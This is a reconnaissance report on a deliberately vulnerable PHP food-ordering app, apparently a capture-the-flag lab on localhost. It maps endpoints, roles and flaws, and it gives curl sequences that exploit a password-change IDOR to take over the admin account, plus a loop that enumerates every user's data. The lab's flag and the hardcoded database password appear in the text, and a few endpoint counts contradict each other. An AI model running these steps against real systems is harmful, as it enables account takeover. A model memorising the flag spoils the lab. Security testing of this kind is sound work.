# Reconnaissance Deliverable: Food App Attack Surface Analysis

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

---

## 1. Executive Summary

This is a PHP-based food ordering web application running on a traditional LAMP stack (Linux/Apache/MySQL/PHP 7.4) deployed as a single Docker container exposing HTTP port 80. The application presents a **CRITICAL security risk** with multiple severe vulnerabilities that enable complete application compromise and privilege escalation to administrative access.

**Core Technology Stack:**
- **Frontend:** Bootstrap 5.3.3, jQuery 3.6.0 (loaded from CDN without SRI)
- **Backend:** PHP 7.4 with native session management, no MVC framework
- **Database:** MySQL 8.0.37 with PDO prepared statements
- **Infrastructure:** Apache 2.4.41 on Ubuntu 20.04, single Docker container, HTTP-only (no TLS)

**Primary Attack Surface Components:**
- 5 public web pages (index, login, register, and 2 authenticated pages)
- 5 REST API endpoints (3 public, 2 authenticated)
- Session-based authentication with PHP native sessions
- Role-based access control (2 roles: 'visitor' and 'ADMIN')

**Critical Security Findings:**
1. **Two IDOR Vulnerabilities (CRITICAL):** Authorization bypass in password change and favorites API allows horizontal privilege escalation and complete account takeover including admin account compromise
2. **Two XSS Vulnerabilities (CRITICAL):** DOM-based XSS in restaurant search and favorites rendering enables session hijacking and credential theft
3. **Session Fixation (CRITICAL):** No session regeneration after authentication enables session fixation attacks
4. **Missing Session Security (CRITICAL):** No HttpOnly, Secure, or SameSite flags expose session cookies to JavaScript and network interception
5. **No Transport Security (HIGH):** HTTP-only deployment exposes all traffic including passwords in cleartext
6. **Hardcoded Credentials (HIGH):** Database password committed to version control
7. **No CSRF Protection (HIGH):** All state-changing operations vulnerable to CSRF attacks
8. **Missing Security Headers (MEDIUM):** No CSP, HSTS, X-Frame-Options, or other security headers

**Positive Security Controls Identified:**
- SQL injection properly prevented via consistent PDO prepared statement usage with `ATTR_EMULATE_PREPARES => false`
- Password hashing uses bcrypt with proper `password_hash()` and `password_verify()`
- No command injection vulnerabilities (no system command execution functionality exists)

**CTF Flag Capture Path:** The admin flag is stored in an environment variable and displayed only to users with 'ADMIN' role on the profile page. An attacker can exploit the password change IDOR vulnerability to change the admin user's password (user ID 7), login as admin, and retrieve the flag - achievable in under 5 minutes with basic HTTP tools.

---

## 2. Technology & Service Map

### Frontend Technologies
- **Framework:** No frontend framework (vanilla JavaScript with jQuery)
- **UI Library:** Bootstrap 5.3.3 (loaded from `cdn.jsdelivr.net`)
- **JavaScript Library:** jQuery 3.6.0 (loaded from `code.jquery.com`)
- **Security Issue:** CDN resources loaded without Subresource Integrity (SRI) hashes, creating supply chain vulnerability

### Backend Technologies
- **Language:** PHP 7.4 (installed via apt on Ubuntu 20.04)
- **Framework:** No MVC framework - traditional procedural PHP architecture
- **Database Driver:** PDO with MySQL driver
- **Session Management:** PHP native sessions (no Redis, no Memcached)
- **Password Hashing:** `password_hash()` with PASSWORD_BCRYPT algorithm
- **Key Dependencies:** None - no composer.json, uses only native PHP functions

### Infrastructure
- **Web Server:** Apache 2.4.41 (Ubuntu)
- **Database:** MySQL 8.0.37 (running in same container as Apache)
- **Hosting:** Single Docker container using `ubuntu:20.04` base image
- **Process Manager:** supervisord (manages both Apache and MySQL processes)
- **Port Exposure:** Port 80 (HTTP only, no HTTPS/TLS configuration)
- **Deployment:** docker-compose.yml orchestrates single-container deployment

### Identified Subdomains
The subfinder scan discovered multiple subdomains, but these appear to be false positives or unrelated to the target application:
- server02.counterintel.localhost
- mse-ca-mail.corp.mse.localhost
- mail02.regency.localhost
- mail.regency.localhost
- server2.hunter.localhost
- fndlync01.5ninesdata.localhost
- autodiscover.localhost
- www.localhost
- naeu2.naeuinc.localhost
- mail.localhost
- mail03.regency.localhost
- owa.regency.localhost
- sbs.allsaintsschool.localhost
- autodiscover.regency.localhost
- tools.sonoma.edu.localhost
- exchvm.nwcnet.localhost

**Assessment:** None of these subdomains resolve to the Food App application at `localhost:34999`. They appear to be DNS cache entries or unrelated local development environments.

### Open Ports & Services
**From nmap scan of localhost:**
- **Port 80/tcp:** Caddy httpd (reverse proxy - not the Food App)
- **Port 443/tcp:** SSL/HTTPS (Caddy)
- **Port 631/tcp:** CUPS 2.3 printing service (out of scope)
- **Port 9999/tcp:** Unknown HTTP service (out of scope)
- **Port 49152/tcp:** Tailscale VPN service (out of scope)

**Target Application Port:** The Food App runs on port **34999** (HTTP only), not discovered by default nmap port scan. Confirmed via manual testing and docker-compose.yml configuration.

### Database Configuration
- **DBMS:** MySQL 8.0.37
- **Database Name:** app_db
- **User:** web_db_user
- **Password:** P@ssw0rd123! (HARDCODED in `/app/website/include/config.php` line 6)
- **Host:** 127.0.0.1 (localhost - same container)
- **Privileges:** ALL PRIVILEGES (violates principle of least privilege)
- **Security Issue:** Excessive database permissions allow compromised application to drop tables, modify schema, and grant permissions

---

## 3. Authentication & Session Management Flow

### Entry Points
**Public Entry Points:**
- `/login.php` (GET) - Login form interface
- `/api/login.php` (POST) - Authentication API endpoint
- `/register.php` (GET) - Registration form interface
- `/api/register.php` (POST) - User registration API endpoint

**Authenticated Entry Points:**
- `/profile.php` (GET) - User profile page (requires authentication)
- `/logout.php` (GET) - Session termination endpoint

### Authentication Mechanism

**Registration Flow:**
1. User submits registration form at `/register.php`
2. Client-side AJAX sends POST request to `/api/register.php` with:
   - `username` (string, no validation)
   - `email` (string, no format validation)
   - `password` (string, no complexity requirements)
3. Server hashes password using `password_hash($_POST['password'], PASSWORD_BCRYPT)` at `/api/register.php:9`
4. Server inserts user into database with prepared statement at lines 12-13
5. Database assigns default role 'visitor' via constraint at `/app/init.sql:40`
6. User account is immediately active (no email verification)
7. Success response redirects client to login page

**Login Flow:**
1. User submits credentials at `/login.php`
2. Client-side AJAX sends POST request to `/api/login.php` with:
   - `username` (string)
   - `password` (string)
3. Server calls `session_start()` at `/api/login.php:3` (CRITICAL: accepts any session ID without regeneration)
4. Server queries database for user: `SELECT * FROM users WHERE username = :username` at lines 12-14 (protected by prepared statements)
5. Server verifies password using `password_verify($password, $user['password'])` at line 16 (cryptographically sound)
6. On success, server sets `$_SESSION['user_id'] = $user['id']` at line 17
7. **CRITICAL MISSING:** No `session_regenerate_id(true)` call - session fixation vulnerability
8. Client redirects to `/profile.php`

**Session Validation:**
All authenticated pages check session using this pattern:
```php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit();
}
```
Locations: `/profile.php:5-8`, `/api/change_password.php:7-10`, `/api/get_favorite_restaurants.php:7-10`

**Logout Flow:**
1. User clicks logout link at `/logout.php`
2. Server calls `session_start()` at line 2
3. Server calls `session_destroy()` at line 3
4. **INCOMPLETE:** Missing `session_unset()` and explicit cookie deletion
5. Client redirected to `/login.php`

### Code Pointers
**Authentication Logic:**
- `/app/website/api/login.php` - Lines 3-21 (complete authentication flow)
- `/app/website/api/register.php` - Lines 6-20 (user creation)
- `/app/website/logout.php` - Lines 2-5 (session termination)

**Session Validation:**
- `/app/website/profile.php:5-8` - Authentication check with redirect
- `/app/website/api/change_password.php:7-10` - Authentication check with JSON error
- `/app/website/api/get_favorite_restaurants.php:7-10` - Authentication check with JSON error

**Password Security:**
- Password hashing: `/app/website/api/register.php:9` - `password_hash()` with PASSWORD_BCRYPT
- Password verification: `/app/website/api/login.php:16` - `password_verify()`
- Password change: `/app/website/api/change_password.php:22` - Re-hashing with bcrypt

### 3.1 Role Assignment Process

**Role Determination:**
Roles are assigned automatically during user registration through database default constraint. The role field in the users table has `DEFAULT 'visitor'` specified at `/app/init.sql:40`.

**Default Role:**
All new users receive the 'visitor' role automatically. There is no role selection during registration - the default is applied by MySQL at row insertion time.

**Role Upgrade Path:**
- **No legitimate role upgrade mechanism exists** in the application
- Users cannot self-service elevate to 'ADMIN' role
- No admin panel found for role management
- No API endpoint exists to change user roles
- The only way to become admin is to compromise the existing admin account (user ID 7) via the password change IDOR vulnerability

**Code Implementation:**
- Role default definition: `/app/init.sql:40` - `role varchar(50) NULL DEFAULT 'visitor'`
- Role assignment during registration: `/app/website/api/register.php:12-13` - INSERT statement relies on database default
- No explicit role setting code exists in application layer

### 3.2 Privilege Storage & Validation

**Storage Location:**
User privileges are stored in the `users` table `role` column as a VARCHAR(50) string. The role value is loaded into memory when needed and compared directly - not cached in sessions.

**Session Storage:**
Only `user_id` is stored in `$_SESSION` - the role is NOT stored in session data. Each page that needs role information queries the database using the session user_id.

**Validation Points:**
- **Single role check location:** `/app/website/profile.php:123` - `if ($user['role'] === 'ADMIN')`
- This is the ONLY authorization check in the entire application beyond authentication
- Used to conditionally display the CTF flag to admin users

**Database Query for Role:**
```php
// profile.php lines 10-13
$stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = :id');
$stmt->execute(['id' => $_SESSION['user_id']]);
$user = $stmt->fetch();
```

**Cache/Session Persistence:**
- Roles are NOT cached - fetched from database on every profile page load
- No session-based role caching means role changes would take effect immediately
- However, no role change functionality exists, making this design moot

**Code Pointers:**
- Role storage schema: `/app/init.sql:40` - VARCHAR(50) column definition
- Role query: `/app/website/profile.php:10-13` - Fetches user record including role
- Role validation: `/app/website/profile.php:123` - Single `===` comparison

### 3.3 Role Switching & Impersonation

**Impersonation Features:**
- **NONE** - No admin impersonation functionality exists
- No "switch user" or "view as" features
- No temporary privilege elevation mechanisms

**Role Switching:**
- **NONE** - No role switching functionality
- No "sudo mode" or temporary elevation
- Users maintain their assigned role permanently

**Audit Trail:**
- **NONE** - No logging of any kind exists in the application
- No audit trail for authentication events
- No logging of authorization failures
- No tracking of profile access or flag viewing
- Zero security event logging capability

**Code Implementation:**
- No impersonation code exists anywhere in the application
- No role switch endpoints or functionality
- No logging infrastructure present

**Security Implication:**
The lack of audit logging means that when an attacker exploits the IDOR vulnerability to compromise the admin account and view the flag, there will be no forensic evidence of the attack. The security team would have no way to detect:
- When the admin password was changed
- Who changed it (which user_id triggered the change)
- When the flag was accessed
- What IP address accessed the admin account

---

## 4. API Endpoint Inventory

Comprehensive inventory of all network-accessible API endpoints with authorization details:

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|---------------------|------------------------|----------------------------|
| POST | `/api/login.php` | anon | None | None | Authenticates user with username/password, creates session with user_id. Uses prepared statements (lines 12-14) and bcrypt verification (line 16). **Missing:** session regeneration, rate limiting, CSRF protection. |
| POST | `/api/register.php` | anon | None | None | Creates new user account with bcrypt password hashing (line 9). Default role 'visitor' assigned by database. **Missing:** email validation, password complexity checks, CAPTCHA, duplicate detection. |
| GET | `/api/search_restaurants.php` | anon | None | None | Public restaurant search via LIKE query (lines 12-15). Accepts `query` GET parameter. Protected by prepared statements. **Vulnerability:** Exposes database errors to users (line 19). |
| GET | `/api/get_favorite_restaurants.php` | user (visitor) | `userId` (GET param) | **BROKEN** - Session check only (lines 7-10), NO ownership validation | **CRITICAL IDOR:** Fetches any user's favorites. Line 14 accepts `userId` from GET without validating it matches `$_SESSION['user_id']`. Any authenticated user can view any other user's data. |
| POST | `/api/change_password.php` | user (visitor) | `userId` (POST body) | **BROKEN** - Session check (lines 7-10), password verified for WRONG user (line 26), UPDATE uses POST userId (line 31) | **CRITICAL IDOR:** Changes password for arbitrary user. Verifies old password for session user but updates password for POST userId. Enables complete account takeover including admin compromise. |
| GET | `/index.php` | anon | None | None | Home page with restaurant search interface. Session-aware (line 3) but public access. **XSS Vulnerability:** Lines 254-264 unsafe jQuery append with restaurant data. |
| GET | `/login.php` | anon | None | None | Login form interface. Client-side form submission to `/api/login.php`. No server-side security controls beyond serving HTML. |
| GET | `/register.php` | anon | None | None | Registration form interface. Client-side form submission to `/api/register.php`. No input validation visible. |
| GET | `/profile.php` | user (visitor) | None | Session check (lines 5-8), role check for FLAG display (line 123) | Authenticated user profile page. Displays username, email, favorites list, and FLAG (admin only). **XSS Vulnerability:** Lines 183-190 unsafe jQuery append. **Properly encoded:** Lines 120, 121, 125 use htmlspecialchars(). |
| GET | `/logout.php` | anon | None | None | Session termination. Calls `session_destroy()` (line 3) but incomplete cleanup. **CSRF Vulnerable:** No token required. |

### Authorization Assessment Summary

**Correctly Implemented Authorization (1 endpoint):**
- `/profile.php` - Proper authentication check (lines 5-8) AND role-based authorization for FLAG display (line 123)

**Authentication Only, No Authorization (3 endpoints):**
- These endpoints verify user is logged in but don't restrict access beyond that:
  - `/profile.php` (for non-flag content)
  - **`/api/get_favorite_restaurants.php`** - SHOULD verify userId matches session ⚠️
  - **`/api/change_password.php`** - SHOULD verify userId matches session ⚠️

**Public Endpoints (No Authorization Needed) (5 endpoints):**
- `/api/login.php`, `/api/register.php`, `/api/search_restaurants.php`, `/index.php`, `/login.php`, `/register.php`, `/logout.php`

**CRITICAL Security Gaps:**
1. **get_favorite_restaurants.php:** Accepts userId from GET parameter, enabling horizontal privilege escalation (view other users' data)
2. **change_password.php:** Uses POST userId for UPDATE statement while verifying old password for session userId, enabling horizontal privilege escalation (change other users' passwords)
3. **No object ownership validation:** Resources with user_id foreign keys are not validated against session user
4. **No CSRF tokens:** All state-changing operations vulnerable to CSRF attacks
5. **No rate limiting:** APIs accept unlimited requests enabling brute force attacks

---

## 5. Potential Input Vectors for Vulnerability Analysis

Comprehensive enumeration of all input vectors in network-accessible code with exact file locations:

### URL Parameters (GET)

| Endpoint | Parameter Name | Purpose | Validation | File Location |
|----------|---------------|---------|-----------|---------------|
| `/api/search_restaurants.php` | `query` | Restaurant search term | None - accepts any string | Line 6: `$query = $_GET['query'] ?? ''` |
| `/api/get_favorite_restaurants.php` | **`userId`** | Target user ID for favorites | **NONE (CRITICAL IDOR)** | Line 14: `$userId = $_GET['userId']` |

### POST Body Fields (JSON/Form)

| Endpoint | Field Name | Purpose | Validation | File Location |
|----------|-----------|---------|-----------|---------------|
| `/api/login.php` | `username` | Authentication username | None | Line 8: `$username = $_POST['username']` |
| `/api/login.php` | `password` | Authentication password | None | Line 9: `$password = $_POST['password']` |
| `/api/register.php` | `username` | New account username | None - no length/format check | Line 7: `$username = $_POST['username']` |
| `/api/register.php` | `email` | New account email | None - no email format validation | Line 8: `$email = $_POST['email']` |
| `/api/register.php` | `password` | New account password | None - no complexity requirements | Line 9: `$_POST['password']` (hashed) |
| `/api/change_password.php` | `oldPassword` | Current password | Verified against session user | Line 13: `$oldPassword = $_POST['oldPassword']` |
| `/api/change_password.php` | `newPassword` | New password | Only confirmation match check | Line 14: `$newPassword = $_POST['newPassword']` |
| `/api/change_password.php` | `confirmPassword` | Password confirmation | Match check against newPassword | Line 15: `$confirmPassword = $_POST['confirmPassword']` |
| `/api/change_password.php` | **`userId`** | Target user for password change | **NONE (CRITICAL IDOR)** | Line 31: `'id' => $_POST['userId']` in UPDATE |

### HTTP Headers

| Header Name | Where Used | Purpose | Validation | File Location |
|------------|-----------|---------|-----------|---------------|
| `Cookie` | All pages/APIs | PHP session ID (PHPSESSID) | None - session_start() accepts any ID | Multiple: `session_start()` calls |
| User-Agent, X-Forwarded-For, etc. | Not used | N/A | N/A | No header processing found |

### Cookie Values

| Cookie Name | Purpose | Security Flags | File Location |
|------------|---------|----------------|---------------|
| `PHPSESSID` | PHP session identifier | **NO HttpOnly, NO Secure, NO SameSite** | Implicitly set by `session_start()` with insecure defaults |

### Session Variables (Stored Server-Side)

| Variable Name | Purpose | Set Location | Validated Location |
|--------------|---------|-------------|-------------------|
| `$_SESSION['user_id']` | Authenticated user identifier | `/api/login.php:17` | `/profile.php:5`, `/api/change_password.php:7`, `/api/get_favorite_restaurants.php:7` |

### File Uploads

**NONE FOUND** - The application does not implement file upload functionality. No `<input type="file">` elements, no `$_FILES` processing, no file handling code exists in any network-accessible endpoint.

### Database-Stored User Input (XSS Vectors)

| Field | Source | Rendered Location | Encoding Status | Vulnerability |
|-------|--------|------------------|----------------|---------------|
| `users.username` | Registration form | `/profile.php:120` | ✅ `htmlspecialchars()` | **SAFE** |
| `users.email` | Registration form | `/profile.php:121` | ✅ `htmlspecialchars()` | **SAFE** |
| `restaurants.name` | Database seed | `/index.php:257` (jQuery) | ❌ No encoding | **XSS VULNERABLE** |
| `restaurants.description` | Database seed | `/index.php:258` (jQuery) | ❌ No encoding | **XSS VULNERABLE** |
| `restaurants.category` | Database seed | `/index.php:259` (jQuery) | ❌ No encoding | **XSS VULNERABLE** |
| `favorite_restaurants.restaurant_name` | Database seed | `/profile.php:186-187` (jQuery) | ❌ No encoding | **XSS VULNERABLE** |

### Input Validation Summary

**Total Input Vectors:** 15
**Validated Inputs:** 1 (password confirmation match check)
**Validation Rate:** 6.7%

**Critical Findings:**
- **Zero format validation** (no email regex, no username character restrictions)
- **Zero length validation** (beyond database VARCHAR constraints)
- **Zero type validation** (no integer checks on userId parameters)
- **Zero sanitization** (no htmlspecialchars on client-submitted data before storage)
- **Minimal output encoding** (only 5 uses of htmlspecialchars in entire codebase)

---

## 6. Network & Interaction Map

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| **Internet Users** | ExternAsset | Internet | Web Browsers | None | External attackers, legitimate users, all network clients |
| **Food App Web Server** | Service | App | Apache 2.4.41 / PHP 7.4 | PII, Tokens, Secrets | Main application - serves all web pages and API endpoints on port 34999 |
| **MySQL Database** | DataStore | Data | MySQL 8.0.37 | PII, Tokens, Secrets | Stores users (passwords, emails), favorites, restaurants. Same container as web server. |
| **CDN (Bootstrap)** | ThirdParty | Internet | jsdelivr.net | Public | Serves Bootstrap CSS/JS - no SRI validation |
| **CDN (jQuery)** | ThirdParty | Internet | code.jquery.com | Public | Serves jQuery library - no SRI validation |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| **Food App Web Server** | Hosts: `http://localhost:34999`; Endpoints: `/`, `/login.php`, `/register.php`, `/profile.php`, `/logout.php`, `/api/login.php`, `/api/register.php`, `/api/search_restaurants.php`, `/api/get_favorite_restaurants.php`, `/api/change_password.php`; Auth: PHP Sessions (PHPSESSID cookie); Dependencies: MySQL Database (localhost), CDN resources; Vulnerabilities: IDOR (2), XSS (2), Session Fixation, Missing CSRF, No HTTPS |
| **MySQL Database** | Engine: `MySQL 8.0.37`; Exposure: `localhost only (127.0.0.1)`; Consumers: `Food App Web Server (same container)`; Credentials: `web_db_user / P@ssw0rd123!` (HARDCODED in config.php); Privileges: `ALL PRIVILEGES` (excessive); Tables: `users`, `favorite_restaurants`, `restaurants`; Vulnerabilities: Hardcoded credentials, excessive privileges |
| **Internet Users** | Access: `HTTP on port 34999`; Capabilities: `Register accounts, login, search restaurants, access APIs`; Constraints: `None - no IP filtering, no rate limiting, no geoblocking` |
| **CDN (Bootstrap)** | URL: `https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/`; Version: `5.3.3`; Security: `No SRI hash validation`; Risk: `Supply chain attack if CDN compromised` |
| **CDN (jQuery)** | URL: `https://code.jquery.com/jquery-3.6.0.min.js`; Version: `3.6.0`; Security: `No SRI hash validation`; Risk: `Supply chain attack if CDN compromised` |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| Internet Users → Food App Web Server | HTTP | `:34999 /` | None | Public |
| Internet Users → Food App Web Server | HTTP | `:34999 /api/login.php` | None | Public, Credentials |
| Internet Users → Food App Web Server | HTTP | `:34999 /api/register.php` | None | Public, PII |
| Internet Users → Food App Web Server | HTTP | `:34999 /api/search_restaurants.php` | None | Public |
| Internet Users → Food App Web Server | HTTP | `:34999 /profile.php` | auth:user | PII, Tokens |
| Internet Users → Food App Web Server | HTTP | `:34999 /api/get_favorite_restaurants.php` | auth:user, **BROKEN:ownership** | PII (IDOR) |
| Internet Users → Food App Web Server | HTTP | `:34999 /api/change_password.php` | auth:user, **BROKEN:ownership** | Secrets (IDOR) |
| Food App Web Server → MySQL Database | TCP | `localhost:3306` | localhost-only | PII, Tokens, Secrets |
| Food App Web Server → CDN (Bootstrap) | HTTPS | `:443` | None | Public |
| Food App Web Server → CDN (jQuery) | HTTPS | `:443` | None | Public |
| User Browser → CDN (Bootstrap) | HTTPS | `:443` | None | Public |
| User Browser → CDN (jQuery) | HTTPS | `:443` | None | Public |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|-----------|----------|-----------|
| **auth:user** | Auth | Requires valid PHP session with `$_SESSION['user_id']` set. Verified by `isset()` check. Redirects to login.php (web pages) or returns JSON error (APIs). |
| **auth:admin** | Authorization | Requires user role === 'ADMIN'. Only enforced on FLAG display in profile.php line 123. NOT enforced on any APIs. |
| **ownership:user** | ObjectOwnership | **SHOULD** verify requesting user owns target object (e.g., `$_GET['userId']` matches `$_SESSION['user_id']`). **NOT IMPLEMENTED** - Missing from get_favorite_restaurants.php and change_password.php, creating IDOR vulnerabilities. |
| **localhost-only** | Network | Database access restricted to localhost (127.0.0.1). Both Apache and MySQL run in same container, preventing external database access. |
| **BROKEN:ownership** | ObjectOwnership | Indicates authorization guard should exist but is missing. Allows authenticated users to access other users' resources by manipulating ID parameters. |

### Network Trust Boundaries

**Boundary 1: Internet → Application**
- **Control:** None - HTTP port 34999 exposed to all network clients
- **Validation:** None - no IP filtering, WAF, or network ACLs
- **Risk:** Unlimited brute force, CSRF, session hijacking over cleartext HTTP

**Boundary 2: Application → Database**
- **Control:** Localhost networking (127.0.0.1) prevents external database access
- **Validation:** Password authentication (hardcoded credentials)
- **Risk:** Compromised application = full database access due to ALL PRIVILEGES grant

**Boundary 3: Application → CDNs**
- **Control:** HTTPS for CDN connections
- **Validation:** None - no SRI hash validation
- **Risk:** CDN compromise or DNS hijacking could inject malicious JavaScript

---

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation | User Count |
|-----------|----------------|--------------|---------------------|-----------|
| **anon** | 0 | Global | No authentication required | N/A (transient) |
| **visitor** | 1 | Global | Default role assigned at registration | 11 users (IDs 1-6, 8-12) |
| **ADMIN** | 5 | Global | Manually assigned in database seed | 1 user (ID 7) |

**Role Definitions:**

**anon (Anonymous/Unauthenticated):**
- No session, no user_id
- Can access public pages and APIs
- Can register new account (becomes 'visitor')

**visitor (Default User Role):**
- Assigned automatically at registration via database default: `/app/init.sql:40`
- Has authenticated session with user_id
- Can access profile, view own data, search restaurants
- **Should only** access own favorites and change own password
- **Actually can** access ANY user's data due to IDOR vulnerabilities

**ADMIN (Administrative Role):**
- Only one admin account in seed data: username='admin', user_id=7, email='admin@foodapp.local'
- Has same privileges as 'visitor' plus:
  - Can view CTF flag on profile page (only privilege difference)
- **No additional API access** - ADMIN role only affects UI flag display
- Password can be changed by any 'visitor' via IDOR exploit

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):
anon → visitor → ADMIN

Detailed Hierarchy:
├── anon (Level 0)
│   ├── Can: Access public pages, search restaurants, register, login
│   └── Cannot: Access authenticated pages, view user data, change passwords
│
├── visitor (Level 1) - Default authenticated role
│   ├── Can: Everything anon can do, PLUS:
│   │   ├── Access profile page
│   │   ├── View own username/email
│   │   ├── View own favorites (intended)
│   │   ├── Change own password (intended)
│   │   └── **IDOR EXPLOIT:** View ANY user's favorites, change ANY user's password
│   └── Cannot: View CTF flag
│
└── ADMIN (Level 5) - Administrative role
    ├── Can: Everything visitor can do, PLUS:
    │   └── View CTF flag on profile page (ONLY additional privilege)
    └── Cannot: Nothing additional - no admin APIs, no user management

Parallel Isolation: NONE
All roles exist in a linear hierarchy with no parallel branches.
```

**Role Switching Mechanisms:**
- **NONE** - No legitimate role switching functionality exists
- Users cannot elevate their own roles
- No admin panel for role management exists
- **EXPLOIT PATH:** Use IDOR to change admin password → login as admin → gain flag access

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|--------------------------|----------------------|
| **anon** | `/` (index.php) | `/`, `/index.php`, `/login.php`, `/register.php`, `/api/login.php`, `/api/register.php`, `/api/search_restaurants.php` | None |
| **visitor** | `/profile.php` (after login) | All anon routes PLUS: `/profile.php`, `/logout.php`, `/api/get_favorite_restaurants.php`, `/api/change_password.php` | PHP Session (PHPSESSID cookie) |
| **ADMIN** | `/profile.php` (after login) | All visitor routes (identical access) | PHP Session (PHPSESSID cookie) |

**Navigation Differences:**
- **anon:** Navigation bar shows "Login" and "Sign Up" links
- **visitor:** Navigation bar shows "Profile" and "Logout" links
- **ADMIN:** Navigation bar identical to visitor (no visual distinction)

**Flag Visibility:**
- Only users with `role === 'ADMIN'` see the flag on `/profile.php:123-126`
- This is the ONLY functional difference between visitor and ADMIN roles

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|------------------|-------------------|------------------|
| **anon** | None | N/A | No session |
| **visitor** | Session check: `if (!isset($_SESSION['user_id']))` at `/profile.php:5`, `/api/change_password.php:7`, `/api/get_favorite_restaurants.php:7` | None beyond session check | `users.role` column (database), fetched on profile page load |
| **ADMIN** | Same session check as visitor | `if ($user['role'] === 'ADMIN')` at `/profile.php:123` - **ONLY authorization check in entire application** | `users.role` column set to 'ADMIN' for user_id=7 in `/app/init.sql:62` |

**Code Locations for Role Checks:**
- **Role assignment:** `/app/init.sql:40` - Database default `DEFAULT 'visitor'`
- **Role query:** `/app/website/profile.php:10-13` - Fetches user record including role column
- **Role validation:** `/app/website/profile.php:123` - `<?php if ($user['role'] === 'ADMIN'): ?>`
- **Flag retrieval:** `/app/website/profile.php:15` - `$flag = getenv('FLAG')`
- **Flag display:** `/app/website/profile.php:124-126` - Conditional div with flag value

**Admin User Seed Data:**
```sql
-- /app/init.sql line 62
INSERT INTO users (id, username, email, password, role) VALUES
(7, 'admin', 'admin@foodapp.local', 
 '$2y$10$... [bcrypt hash]', 
 'ADMIN');
```

---

## 8. Authorization Vulnerability Candidates

### 8.1 Horizontal Privilege Escalation Candidates

Endpoints with object identifiers allowing access to other users' resources at the same privilege level:

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity | Exploitation Details |
|----------|-----------------|--------------------|-----------| ------------|---------------------|
| **CRITICAL** | `/api/change_password.php` | `userId` (POST body) | admin_credential | **CRITICAL - Password change enables complete account takeover** | **Line 31:** Uses `$_POST['userId']` in UPDATE statement instead of `$_SESSION['user_id']`. Attacker can change ANY user's password including admin (user_id=7). Requires knowing victim's current password, which attacker provides for themselves. **Direct path to CTF flag capture.** |
| **HIGH** | `/api/get_favorite_restaurants.php` | `userId` (GET param) | user_data | **HIGH - Privacy violation, reveals personal preferences** | **Line 14:** Accepts `$userId = $_GET['userId']` without ownership validation. Any authenticated user can view any other user's favorite restaurants by changing URL parameter. Data includes restaurant names and user preferences. |

**Exploitation Example - Password Change IDOR:**
```bash
# Step 1: Register and login as attacker
curl -X POST http://localhost:34999/api/register.php \
  -d "username=attacker&email=attacker@test.com&password=AttackerPass123"

curl -X POST http://localhost:34999/api/login.php \
  -d "username=attacker&password=AttackerPass123" \
  -c cookies.txt

# Step 2: Change admin password (user_id=7) - This WORKS because:
# - Line 26 verifies attacker's password (AttackerPass123) 
# - Line 31 updates user_id=7's password (admin account)
curl -X POST http://localhost:34999/api/change_password.php \
  -b cookies.txt \
  -d "oldPassword=AttackerPass123" \
  -d "newPassword=Hacked123" \
  -d "confirmPassword=Hacked123" \
  -d "userId=7"

# Step 3: Login as admin with new password
curl -X POST http://localhost:34999/api/login.php \
  -d "username=admin&password=Hacked123" \
  -c admin_cookies.txt

# Step 4: Access admin profile and retrieve flag
curl -b admin_cookies.txt http://localhost:34999/profile.php
# Flag displayed in HTML: flag{faba79b5-8a02-43ad-aea8-e28cf8fd9024}
```

**Exploitation Example - Favorites IDOR:**
```bash
# After login as any user:
curl -b cookies.txt \
  "http://localhost:34999/api/get_favorite_restaurants.php?userId=1"
# Returns user 1's favorites

curl -b cookies.txt \
  "http://localhost:34999/api/get_favorite_restaurants.php?userId=7"
# Returns admin's favorites (privacy violation)

# Can enumerate all users by iterating userId from 1 to N
for i in {1..12}; do
  curl -s -b cookies.txt \
    "http://localhost:34999/api/get_favorite_restaurants.php?userId=$i"
done
```

### 8.2 Vertical Privilege Escalation Candidates

Endpoints requiring higher privileges that may be accessible through authorization bypass:

| Target Role | Endpoint Pattern | Functionality | Risk Level | Testing Approach |
|------------|-----------------|---------------|-----------|------------------|
| **ADMIN** | `/profile.php` (FLAG section) | View CTF flag environment variable | **CRITICAL** | Cannot be directly accessed by visitor role. Flag display protected by role check at line 123. **However:** Can be reached via horizontal escalation (change admin password via IDOR → login as admin). |
| **ADMIN** | No admin-specific APIs exist | N/A | N/A | The application has NO admin-only API endpoints. The ADMIN role only affects FLAG visibility on profile page. No user management, no admin dashboard, no elevated API access. |

**Indirect Vertical Escalation Path:**
```
visitor (attacker) 
  → exploit horizontal IDOR (change admin password)
  → login as admin 
  → gain ADMIN role privileges 
  → view FLAG on profile page
```

**Why Direct Vertical Escalation Doesn't Exist:**
- No role change functionality (cannot self-elevate)
- No admin APIs to bypass (admin has no special API access)
